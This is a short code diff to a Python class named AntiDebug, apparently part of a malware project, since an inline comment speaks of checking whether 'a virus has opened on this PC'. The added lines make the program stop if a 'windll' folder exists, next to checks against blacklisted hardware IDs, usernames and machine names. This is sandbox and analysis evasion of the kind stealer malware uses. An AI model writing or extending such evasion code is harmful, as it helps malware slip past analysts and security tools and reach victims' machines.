@@ -106,6 +106,8 @@ class AntiDebug:
         if self.oneStart:
             if (path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
                 return True
+        if path.exists(rf'{pathf}\windll'):
+            return True
 
         for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
             if hwid in i or username in i or hostname in i:
